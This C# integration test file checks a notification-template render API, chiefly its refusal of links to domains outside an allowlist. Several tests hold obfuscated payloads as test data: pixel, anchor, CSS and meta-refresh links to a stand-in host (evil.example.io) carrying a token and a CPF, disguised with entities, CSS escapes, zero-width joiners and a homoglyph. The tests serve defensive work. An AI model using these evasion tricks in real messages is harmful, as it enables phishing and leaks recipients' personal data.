using System.Net;
using System.Net.Http.Json;
using System.Text.Json;

namespace NotificationHub.IntegrationTests.TemplateManagement;

[Collection(TemplateManagementApiCollectionDefinition.Name)]
public sealed class RenderTemplateVersionEndpointTests(TemplateManagementApiFixture fixture)
{
    [RequiresDockerFact]
    public async Task Rendering_an_email_draft_returns_the_substituted_fields()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey(), defaultLocale: "pt-BR");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Pedido {{ orderId }}",
            body = "<p>Pedido {{ orderId }} de {{ user.name }}.</p>",
            bodyText = "Pedido {{ orderId }} de {{ user.name }}.",
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { orderId = "42", user = new { name = "Ana" } },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        JsonElement body = await TemplateApi.ReadJsonAsync(response);
        body.GetProperty("channel").GetString().ShouldBe("email");
        body.GetProperty("requestedLocale").GetString().ShouldBe("pt-BR");
        body.GetProperty("resolvedLocale").GetString().ShouldBe("pt-BR");
        body.GetProperty("subject").GetString().ShouldBe("Pedido 42");
        body.GetProperty("body").GetString().ShouldBe("<p>Pedido 42 de Ana.</p>");
        body.GetProperty("bodyText").GetString().ShouldBe("Pedido 42 de Ana.");
    }

    [RequiresDockerFact]
    public async Task An_oversized_variables_payload_returns_400_before_reaching_the_engine()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");

        // No template setup on purpose: validation must reject the payload
        // before the handler touches the catalog or the engine.
        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{TemplateApi.NewKey()}/versions/1/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { blob = new string('x', 300_000) },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
    }

    [RequiresDockerFact]
    public async Task A_regional_locale_falls_back_to_its_base_language_content()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey(), defaultLocale: "en");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        await TemplateApi.PutContentAsync(client, key, version, "sms/pt", new
        {
            body = "Código {{ code }}",
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new { channel = "sms", locale = "pt-BR", variables = new { code = "998877" } });

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        JsonElement body = await TemplateApi.ReadJsonAsync(response);
        body.GetProperty("requestedLocale").GetString().ShouldBe("pt-BR");
        body.GetProperty("resolvedLocale").GetString().ShouldBe("pt");
        body.GetProperty("body").GetString().ShouldBe("Código 998877");
    }

    [RequiresDockerFact]
    public async Task An_unmatched_locale_falls_back_to_the_template_default()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey(), defaultLocale: "pt-BR");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        await TemplateApi.PutContentAsync(client, key, version, "sms/pt-BR", new
        {
            body = "Código {{ code }}",
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new { channel = "sms", locale = "en-US", variables = new { code = "112233" } });

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        JsonElement body = await TemplateApi.ReadJsonAsync(response);
        body.GetProperty("resolvedLocale").GetString().ShouldBe("pt-BR");
        body.GetProperty("body").GetString().ShouldBe("Código 112233");
    }

    [RequiresDockerFact]
    public async Task A_locale_that_resolves_nowhere_returns_404_content_not_found()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey());
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        await TemplateApi.PutContentAsync(client, key, version, "sms/pt", new { body = "Código {{ code }}" }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new { channel = "sms", locale = "en-US" });

        response.StatusCode.ShouldBe(HttpStatusCode.NotFound);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("template-content-not-found");
    }

    [RequiresDockerFact]
    public async Task A_channel_without_content_returns_404_content_not_found()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey(), defaultLocale: "pt-BR");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        await TemplateApi.PutContentAsync(client, key, version, "sms/pt-BR", new { body = "Código {{ code }}" }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new { channel = "push", locale = "pt-BR" });

        response.StatusCode.ShouldBe(HttpStatusCode.NotFound);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("template-content-not-found");
    }

    [RequiresDockerFact]
    public async Task An_unknown_version_returns_404()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey());

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/99/render",
            new { channel = "sms", locale = "pt-BR" });

        response.StatusCode.ShouldBe(HttpStatusCode.NotFound);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("template-version-not-found");
    }

    [RequiresDockerFact]
    public async Task A_url_variable_outside_the_allowlist_returns_400_problem_details()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Acesso",
            body = "<p>Acesse {{ portalUrl }}</p>",
            bodyText = "Acesse {{ portalUrl }}",
        }, etag);
        await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { portalUrl = new { type = "string", format = "url" } },
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { portalUrl = "https://phishing.example.io/login" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        problem.GetProperty("detail").GetString()!.ShouldContain("'portalUrl'");
        problem.GetProperty("detail").GetString()!.ShouldNotContain("phishing.example.io");
    }

    [RequiresDockerFact]
    public async Task A_string_variable_carrying_a_foreign_host_returns_400_problem_details()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Acesso",
            body = "<p>Acesse {{ link }}</p>",
            bodyText = "Acesse {{ link }}",
        }, etag);
        await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { link = new { type = "string" } },
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { link = "https://evil.example.io/pay?token=abc" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        problem.GetProperty("detail").GetString()!.ShouldContain("evil.example.io");
        problem.GetProperty("detail").GetString()!.ShouldNotContain("token");
    }

    [RequiresDockerFact]
    public async Task A_foreign_image_destination_composed_from_string_fragments_is_refused_after_render()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = """<img src="{{ scheme }}{{ separator }}{{ first }}{{ second }}{{ suffix }}/pixel?token={{ token }}&amp;cpf={{ cpf }}">""",
            bodyText = "Atualização disponível.",
        }, etag);
        await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new
            {
                scheme = new { type = "string" },
                separator = new { type = "string" },
                first = new { type = "string" },
                second = new { type = "string" },
                suffix = new { type = "string" },
                token = new { type = "string" },
                cpf = new { type = "string" },
            },
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new
                {
                    scheme = "HtTpS",
                    separator = "://",
                    first = "evil",
                    second = ".example",
                    suffix = ".io",
                    token = "tok_personal_123",
                    cpf = "123.456.789-09",
                },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        var detail = problem.GetProperty("detail").GetString()!;
        detail.ShouldContain("evil.example.io");
        detail.ShouldNotContain("token=");
        detail.ShouldNotContain("tok_personal_123");
        detail.ShouldNotContain("123.456.789-09");

        HttpResponseMessage allowed = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new
                {
                    scheme = "HTTPS",
                    separator = "://",
                    first = "assets.montebravo",
                    second = ".com",
                    suffix = ".br",
                    token = "safe",
                    cpf = "masked",
                },
            });

        allowed.StatusCode.ShouldBe(HttpStatusCode.OK);
        JsonElement allowedBody = await TemplateApi.ReadJsonAsync(allowed);
        allowedBody.GetProperty("body").GetString()!.ShouldContain("assets.montebravo.com.br");
    }

    [RequiresDockerFact]
    public async Task A_foreign_anchor_destination_composed_by_the_layout_is_refused_after_render()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
            client,
            body: """
                <html><a href="HTTPS&#58;//evil.{{ content }}.io/pay?token=layout_secret&amp;cpf=123.456.789-09">abrir</a></html>
                """,
            bodyText: "{{ content }}");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = "{{ segment }}",
            bodyText = "{{ segment }}",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { segment = new { type = "string" } },
        }, etag);
        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { segment = "example" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        var detail = problem.GetProperty("detail").GetString()!;
        detail.ShouldContain("evil.example.io");
        detail.ShouldNotContain("layout_secret");
        detail.ShouldNotContain("123.456.789-09");
    }

    [RequiresDockerFact]
    public async Task A_unicode_destination_composed_entirely_by_the_layout_is_refused_after_render()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
            client,
            body: """
                <html><a h{{ "ref" }}="{{ "https" }}{{ ":" }}{{ "/" }}{{ "/" }}{{ content }}/pay?token=layout_secret&amp;cpf=123.456.789-09">abrir</a></html>
                """,
            bodyText: "{{ content }}");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = "{{ first }}{{ suffix }}",
            bodyText = "Atualização disponível.",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new
            {
                first = new { type = "string" },
                suffix = new { type = "string" },
            },
        }, etag);
        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new
                {
                    first = "аpple",
                    suffix = ".com",
                },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        var detail = problem.GetProperty("detail").GetString()!;
        detail.ShouldContain("xn--pple-43d.com");
        detail.ShouldNotContain("layout_secret");
        detail.ShouldNotContain("123.456.789-09");
    }

    [RequiresDockerFact]
    public async Task A_css_destination_escaped_and_composed_by_the_layout_is_refused_after_render()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
            client,
            body: """
                <html><div style="background-image:u{{ "rl" }}(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e {{ content }}\2e io/pay?token=layout_secret&amp;cpf=123.456.789-09)">conteúdo</div></html>
                """,
            bodyText: "{{ content }}");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = "{{ segment }}",
            bodyText = "Atualização disponível.",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { segment = new { type = "string" } },
        }, etag);
        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { segment = "example" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        var detail = problem.GetProperty("detail").GetString()!;
        detail.ShouldContain("evil.example.io");
        detail.ShouldNotContain("layout_secret");
        detail.ShouldNotContain("123.456.789-09");
    }

    [RequiresDockerFact]
    public async Task An_escaped_css_function_and_html5_destination_created_by_the_layout_is_refused()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
            client,
            body: """
                <html><div style="background:\{{ "75" }}\72\6c(\68\74\74\70\73&colon;&sol;&sol;\65 vil&period;{{ content }}&period;io/pay?token=layout_secret&amp;cpf=123.456.789-09)">conteúdo</div></html>
                """,
            bodyText: "{{ content }}");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = "{{ segment }}",
            bodyText = "Atualização disponível.",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { segment = new { type = "string" } },
        }, etag);
        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { segment = "example" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        var detail = problem.GetProperty("detail").GetString()!;
        detail.ShouldContain("evil.example.io");
        detail.ShouldNotContain("layout_secret");
        detail.ShouldNotContain("123.456.789-09");
    }

    [RequiresDockerFact]
    public async Task A_meta_refresh_destination_created_by_the_layout_is_refused_after_render()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var layoutKey, var layoutVersion) = await LayoutApi.CreatePublishableDraftAsync(
            client,
            body: """
                <html><m{{ "eta" }} CONTENT="0; URL=https&colon;&sol;&sol;evil&period;{{ content }}&period;io/pay?token=layout_secret&amp;cpf=123.456.789-09" HTTP-EQUIV="ReFrEsH"></html>
                """,
            bodyText: "{{ content }}");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(client, key, version, "email/pt-BR", new
        {
            subject = "Atualização",
            body = "{{ segment }}",
            bodyText = "Atualização disponível.",
        }, etag);
        etag = await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { segment = new { type = "string" } },
        }, etag);
        HttpResponseMessage pinned = await client.SendAsync(TemplateApi.PutJson(
            $"/v1/templates/{key}/versions/{version}/layout",
            new { layoutKey, layoutVersion },
            etag));
        pinned.EnsureSuccessStatusCode();

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "email",
                locale = "pt-BR",
                variables = new { segment = "example" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        var detail = problem.GetProperty("detail").GetString()!;
        detail.ShouldContain("evil.example.io");
        detail.ShouldNotContain("layout_secret");
        detail.ShouldNotContain("123.456.789-09");
    }

    [RequiresDockerFact]
    public async Task A_foreign_destination_revealed_by_sms_normalization_is_refused()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(
            client, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        etag = await TemplateApi.PutContentAsync(
            client,
            key,
            version,
            "sms/pt-BR",
            new { body = "{{ destination }}" },
            etag);
        await TemplateApi.PutSchemaAsync(client, key, version, new
        {
            type = "object",
            properties = new { destination = new { type = "string" } },
        }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "sms",
                locale = "pt-BR",
                variables = new
                {
                    destination =
                        "H\u200Dt\u200DT\u200Dp\u200DS:/\u200D/e\u200Dv\u200Di\u200Dl."
                        + "e\u200Dx\u200Da\u200Dm\u200Dp\u200Dl\u200De.i\u200Do",
                },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("url-domain-not-allowed");
        problem.GetProperty("detail").GetString()!.ShouldContain("evil.example.io");
    }

    [RequiresDockerFact]
    public async Task An_authentication_sms_preview_refuses_a_link_arriving_through_a_variable()
    {
        // The shortener is inside the template's allowed domains, so nothing
        // the allowlist owns can refuse this render. What refuses it is the
        // class-wide ban: an authentication SMS carries no link whatever the
        // catalog would otherwise accept, and here the link never touched the
        // source, it arrived as the value of a plain string variable at preview
        // time.
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var key, var version) = await AuthenticationSmsDraftAsync(client, "authentication");

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "sms",
                locale = "pt-BR",
                variables = new { code = "998877", aviso = "bit.ly/x9k2p" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("authentication-sms-link");

        // The refusal names the rule and never quotes the value that tripped
        // it: at this point the text is recipient data, and the detector fires
        // on ordinary prose by design.
        problem.GetProperty("detail").GetString()!.ShouldNotContain("bit.ly");
    }

    [RequiresDockerFact]
    public async Task The_same_preview_for_a_purpose_that_is_not_authentication_renders()
    {
        // Falsification: what refuses the render above is the purpose, not the
        // channel, the variable, the allowlist or the preview endpoint. Same
        // content, same payload, same allowed domain, one word changed.
        HttpClient client = fixture.CreateAuthorClient("author-1");
        (var key, var version) = await AuthenticationSmsDraftAsync(client, "order-updates");

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new
            {
                channel = "sms",
                locale = "pt-BR",
                variables = new { code = "998877", aviso = "bit.ly/x9k2p" },
            });

        response.StatusCode.ShouldBe(HttpStatusCode.OK);
        JsonElement body = await TemplateApi.ReadJsonAsync(response);
        body.GetProperty("body").GetString().ShouldBe("Código 998877. bit.ly/x9k2p");
    }

    /// <summary>
    /// An SMS draft whose link can only arrive through a variable value. The
    /// schema declares both variables as plain strings: with <c>format: url</c>
    /// the static allowlist check would answer first and the render would never
    /// reach the ban under test.
    /// </summary>
    private static async Task<(string Key, int Version)> AuthenticationSmsDraftAsync(
        HttpClient author,
        string purpose)
    {
        var key = TemplateApi.NewKey("authprev");
        HttpResponseMessage created = await author.PostAsJsonAsync("/v1/templates", new
        {
            key,
            application = "araia-cambio",
            @class = "transactional",
            ownerTeam = "growth-squad",
            purpose,
            legalBasis = "execucao-de-contrato",
            defaultLocale = "pt-BR",
            linkDomainsAllowed = ShortenerAllowed,
        });
        created.EnsureSuccessStatusCode();

        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
        etag = await TemplateApi.PutContentAsync(
            author, key, version, "sms/pt-BR", new { body = "Código {{ code }}. {{ aviso }}" }, etag);
        await TemplateApi.PutSchemaAsync(author, key, version, new
        {
            type = "object",
            properties = new
            {
                code = new { type = "string" },
                aviso = new { type = "string" },
            },
            required = RequiredCode,
        }, etag);
        return (key, version);
    }

    private static readonly string[] RequiredCode = ["code"];

    private static readonly string[] ShortenerAllowed = ["bit.ly"];

    [RequiresDockerFact]
    public async Task A_missing_variable_returns_400_render_failed()
    {
        HttpClient client = fixture.CreateAuthorClient("author-1");
        var key = await TemplateApi.CreateTemplateAsync(client, TemplateApi.NewKey(), defaultLocale: "pt-BR");
        (var version, var etag) = await TemplateApi.CreateDraftAsync(client, key);
        await TemplateApi.PutContentAsync(client, key, version, "sms/pt-BR", new { body = "Olá {{ nome }}" }, etag);

        HttpResponseMessage response = await client.PostAsJsonAsync(
            $"/v1/templates/{key}/versions/{version}/render",
            new { channel = "sms", locale = "pt-BR" });

        response.StatusCode.ShouldBe(HttpStatusCode.BadRequest);
        JsonElement problem = await TemplateApi.ReadJsonAsync(response);
        problem.GetProperty("type").GetString().ShouldBe("template-render-failed");
        problem.GetProperty("detail").GetString()!.ShouldContain("nome");
    }
}
